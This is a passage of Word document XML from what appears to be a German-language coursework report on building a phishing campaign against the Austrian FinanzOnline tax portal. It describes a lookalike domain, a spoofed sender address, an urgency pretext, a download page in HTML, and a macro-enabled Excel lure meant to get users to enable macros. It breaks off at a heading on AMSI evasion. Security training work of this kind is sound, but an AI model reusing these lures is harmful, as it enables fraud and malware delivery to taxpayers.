          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Die Originaldomain von Finanzonline ist folgende: https://finanzonline.bmf.gv.at</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="597CA313" w14:textId="5F812EC8" w:rsidR="005423C4" w:rsidRPr="00B47CB9" w:rsidRDefault="005423C4" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79EC905C" w14:textId="6ABA14E1" w:rsidR="00F43F4F" w:rsidRPr="00B47CB9" w:rsidRDefault="006E1121" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Eine möglichst ähnliche und noch freie ist die folgende:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="519871D9" w14:textId="77777777" w:rsidR="005423C4" w:rsidRPr="00B47CB9" w:rsidRDefault="005423C4" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01E2DDAA" w14:textId="54E84A72" w:rsidR="00E3080D" w:rsidRPr="00B47CB9" w:rsidRDefault="00E3080D" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6E7CDF56" wp14:editId="534EF33D">
            <wp:extent cx="5759450" cy="332740"/>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332740"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="11797F45" w14:textId="5A71CEEE" w:rsidR="007D5A4E" w:rsidRPr="00B47CB9" w:rsidRDefault="007D5A4E" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B1C677C" w14:textId="315D47BC" w:rsidR="006E1121" w:rsidRPr="00B47CB9" w:rsidRDefault="006E1121" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Diese wäre für 14 € monatlich </w:t>
      </w:r>
      <w:r w:rsidR="00556D9E" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">kaufbar, </w:t>
      </w:r>
      <w:r w:rsidR="0035148A" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">im Rahmen dieser Aufgabenstellung werde ich das natürlich nicht machen. </w:t>
      </w:r>
      <w:r w:rsidR="001F76B8" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Die </w:t>
      </w:r>
      <w:r w:rsidR="001C332E" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>E-Mail</w:t>
      </w:r>
      <w:r w:rsidR="001F76B8" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> würde von der Adresse </w:t>
      </w:r>
      <w:hyperlink r:id="rId18" w:history="1">
        <w:r w:rsidR="001F76B8" w:rsidRPr="00B47CB9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>noreply@finanzonline.co.at</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="001F76B8" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> ausgehen</w:t>
      </w:r>
      <w:r w:rsidR="00072E3D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">. Sollte der Empfänger auf die </w:t>
      </w:r>
      <w:r w:rsidR="001C332E" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>E-Mail</w:t>
      </w:r>
      <w:r w:rsidR="00072E3D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> antworten würde dieser eine Meldung bekommen, dass </w:t>
      </w:r>
      <w:r w:rsidR="001B38A4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">man auf diese </w:t>
      </w:r>
      <w:r w:rsidR="00DF3F57" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>E-Mail-Adresse</w:t>
      </w:r>
      <w:r w:rsidR="001B38A4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> nicht antworten kann. </w:t>
      </w:r>
      <w:r w:rsidR="00C80ED8" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Außerdem ist momentan aufgrund von Corona mit einer Wartezeit von 2 Wochen zu rechnen. Damit </w:t>
      </w:r>
      <w:r w:rsidR="00D72A69">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00C80ED8" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>eine Anfrage fristgerecht bearbeitet wird soll der Empfänger</w:t>
      </w:r>
      <w:r w:rsidR="001C332E" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> das zur Verfügung gestellte Tool verwenden.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0742D070" w14:textId="2942FA7B" w:rsidR="001C332E" w:rsidRPr="00B47CB9" w:rsidRDefault="001C332E" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F777C10" w14:textId="7047CAF9" w:rsidR="00931F73" w:rsidRPr="00B47CB9" w:rsidRDefault="00456783" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Für d</w:t>
      </w:r>
      <w:r w:rsidR="00931F73" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>en Download wurde folgende Webseite entwickelt</w:t>
      </w:r>
      <w:r w:rsidR="007C466D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">, beim </w:t>
      </w:r>
      <w:r w:rsidR="00D72A69">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r w:rsidR="007C466D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>lick auf das Logo kommt man zum Download:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1909EB78" w14:textId="15BBE6F3" w:rsidR="00931F73" w:rsidRPr="00B47CB9" w:rsidRDefault="00931F73" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6497ABC0" w14:textId="0532C9EB" w:rsidR="007C466D" w:rsidRPr="00B47CB9" w:rsidRDefault="007C466D" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0878F000" wp14:editId="406944BF">
            <wp:extent cx="5759450" cy="4790440"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>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4790440"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7971B1DC" w14:textId="3E4F2CB8" w:rsidR="00931F73" w:rsidRPr="00B47CB9" w:rsidRDefault="00931F73" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74E127EA" w14:textId="7CC5208F" w:rsidR="000F5EA7" w:rsidRPr="00B47CB9" w:rsidRDefault="000F5EA7" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9060"/>
      </w:tblGrid>
      <w:tr w:rsidR="00C07C8E" w:rsidRPr="00866A18" w14:paraId="5E587310" w14:textId="77777777" w:rsidTr="00C07C8E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6F481489" w14:textId="77777777" w:rsidR="00701E88" w:rsidRPr="00B47CB9" w:rsidRDefault="00701E88" w:rsidP="00701E88">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>&lt;!DOCTYPE html&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B48CC6C" w14:textId="77777777" w:rsidR="00701E88" w:rsidRPr="00B47CB9" w:rsidRDefault="00701E88" w:rsidP="00701E88">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>&lt;html lang="de"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72D7206D" w14:textId="77777777" w:rsidR="00701E88" w:rsidRPr="00B47CB9" w:rsidRDefault="00701E88" w:rsidP="00701E88">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>&lt;head&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4203E398" w14:textId="77777777" w:rsidR="00701E88" w:rsidRPr="00B47CB9" w:rsidRDefault="00701E88" w:rsidP="00701E88">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;meta name="description" content="Erledigen Sie Ihre Steuererklärungen und andere Anträge bequem über das E-Government Portal der österreichischen Finanzverwaltung."&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A3F0A93" w14:textId="77777777" w:rsidR="00701E88" w:rsidRPr="008E2D33" w:rsidRDefault="00701E88" w:rsidP="00701E88">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>&lt;/head&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F856066" w14:textId="77777777" w:rsidR="00701E88" w:rsidRPr="008E2D33" w:rsidRDefault="00701E88" w:rsidP="00701E88">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>&lt;body class="login-page"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4AD00F55" w14:textId="77777777" w:rsidR="00701E88" w:rsidRPr="00B47CB9" w:rsidRDefault="00701E88" w:rsidP="00701E88">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>&lt;img src="./img/Unbenannt.PNG"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2AE90766" w14:textId="77777777" w:rsidR="00701E88" w:rsidRPr="00B47CB9" w:rsidRDefault="00701E88" w:rsidP="00701E88">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="48CD8D86" w14:textId="77777777" w:rsidR="00701E88" w:rsidRPr="008E2D33" w:rsidRDefault="00701E88" w:rsidP="00701E88">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>&lt;div style="margin: 30px"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10BB33BC" w14:textId="77777777" w:rsidR="00701E88" w:rsidRPr="008E2D33" w:rsidRDefault="00701E88" w:rsidP="00701E88">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;h1&gt;Finanzonline Connect&lt;/h1&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78BC75E8" w14:textId="77777777" w:rsidR="00701E88" w:rsidRPr="00B47CB9" w:rsidRDefault="00701E88" w:rsidP="00701E88">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>&lt;p&gt;Erledigen Sie Ihre Steuererklaerungen und andere Antraege bequem ueber das E-Government Portal der Oesterreichischen Finanzverwaltung.&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7104317A" w14:textId="77777777" w:rsidR="00701E88" w:rsidRPr="00B47CB9" w:rsidRDefault="00701E88" w:rsidP="00701E88">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;p&gt;Hier gehts zum Download:&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48EAFA40" w14:textId="77777777" w:rsidR="00701E88" w:rsidRPr="008E2D33" w:rsidRDefault="00701E88" w:rsidP="00701E88">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>&lt;p&gt;&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="798F367F" w14:textId="77777777" w:rsidR="00701E88" w:rsidRPr="008E2D33" w:rsidRDefault="00701E88" w:rsidP="00701E88">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;p&gt;&lt;a href="App/FinanzOnlineConnect.xlsm" download&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="062AB0C2" w14:textId="77777777" w:rsidR="00701E88" w:rsidRPr="008E2D33" w:rsidRDefault="00701E88" w:rsidP="00701E88">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        &lt;img height="500" src="img/3connect-logo.png"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2ECBB774" w14:textId="77777777" w:rsidR="00701E88" w:rsidRPr="008E2D33" w:rsidRDefault="00701E88" w:rsidP="00701E88">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;/a&gt;&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5849A0BA" w14:textId="77777777" w:rsidR="00701E88" w:rsidRPr="008E2D33" w:rsidRDefault="00701E88" w:rsidP="00701E88">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>&lt;/div&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1BA7D345" w14:textId="77777777" w:rsidR="00701E88" w:rsidRPr="008E2D33" w:rsidRDefault="00701E88" w:rsidP="00701E88">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>&lt;/body&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="018820A1" w14:textId="1060AD6D" w:rsidR="00C07C8E" w:rsidRPr="008E2D33" w:rsidRDefault="00701E88" w:rsidP="00701E88">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>&lt;/html&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C07C8E" w:rsidRPr="00B47CB9" w14:paraId="63E10995" w14:textId="77777777" w:rsidTr="00C07C8E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="02431DF6" w14:textId="4097C98A" w:rsidR="00C07C8E" w:rsidRPr="00B47CB9" w:rsidRDefault="00DE3EBC" w:rsidP="00361EDC">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Index.html</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="317F0529" w14:textId="39EC587F" w:rsidR="000F5EA7" w:rsidRPr="00B47CB9" w:rsidRDefault="000F5EA7" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B0BE092" w14:textId="15DA85A4" w:rsidR="00931F73" w:rsidRPr="00B47CB9" w:rsidRDefault="003D2E78" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Die Excel Datei wurde wie folgt </w:t>
      </w:r>
      <w:r w:rsidR="00C91C04" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>visualisiert, um einen einladenden Eindruck zu vermitteln</w:t>
      </w:r>
      <w:r w:rsidR="00D72A69">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (siehe Abbildung)</w:t>
      </w:r>
      <w:r w:rsidR="00285038" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37548296" w14:textId="1259FE18" w:rsidR="008320F9" w:rsidRPr="00B47CB9" w:rsidRDefault="008320F9" w:rsidP="00361EDC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2175A467" wp14:editId="17C354AA">
            <wp:extent cx="5759450" cy="3763010"/>
            <wp:effectExtent l="0" t="0" r="0" b="889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763010"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="33FBE750" w14:textId="5CC93EC1" w:rsidR="002945C0" w:rsidRPr="00B47CB9" w:rsidRDefault="00285038" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Im linken oberen Feld </w:t>
      </w:r>
      <w:r w:rsidR="0067268D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>enthält d</w:t>
      </w:r>
      <w:r w:rsidR="00264FD3" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">ie Arbeitsmappe eine Mitteilung, welche beschreibt, dass </w:t>
      </w:r>
      <w:r w:rsidR="0008079D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Makros aktiviert werden müssen, um eine Verbindung zum Server aufbauen zu können. Der Ladekreis soll vermitteln, dass </w:t>
      </w:r>
      <w:r w:rsidR="00550C2F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">die Anwendung lädt und </w:t>
      </w:r>
      <w:r w:rsidR="002945C0" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>darauf wartet, bis der Benutzer „endlich“ auf den „Enable Content“ Button klickt.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F795FF6" w14:textId="5E631EC8" w:rsidR="00C16E2A" w:rsidRPr="00B47CB9" w:rsidRDefault="00C16E2A" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D204817" w14:textId="5F6034CC" w:rsidR="008320F9" w:rsidRPr="00B47CB9" w:rsidRDefault="00C16E2A" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Auf der linken Seite wurde eine Service Navigation angebracht (nur Bild).</w:t>
      </w:r>
      <w:r w:rsidR="0078045F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F71D43" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Am unteren Bildschirmrand erhält der Benutzer Hinweise zum Login.</w:t>
      </w:r>
      <w:r w:rsidR="0078045F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008320F9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Der Login und Registrierungsbutton </w:t>
      </w:r>
      <w:r w:rsidR="00A039DC" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>sollen</w:t>
      </w:r>
      <w:r w:rsidR="008320F9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> dem User das Gefühl geben sich einloggen bzw. registrieren zu können.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B69F452" w14:textId="5FE86E6D" w:rsidR="00A039DC" w:rsidRPr="00B47CB9" w:rsidRDefault="00A039DC" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72E13578" w14:textId="68C3513C" w:rsidR="00611B17" w:rsidRPr="00B47CB9" w:rsidRDefault="00611B17" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:b/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>AMSI</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EAB266B" w14:textId="77777777" w:rsidR="00611B17" w:rsidRPr="00B47CB9" w:rsidRDefault="00611B17" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2CB5A927" w14:textId="28B2A5FB" w:rsidR="00F71D43" w:rsidRPr="00B47CB9" w:rsidRDefault="001770D6" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Als nächstes began</w:t>
      </w:r>
      <w:r w:rsidR="00F7317F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">ich </w:t>
      </w:r>
      <w:r w:rsidR="00F7317F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">mir anzusehen, </w:t>
      </w:r>
      <w:r w:rsidR="00636132" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">um </w:t>
      </w:r>
      <w:r w:rsidR="00F7317F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">was </w:t>
      </w:r>
      <w:r w:rsidR="00636132" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
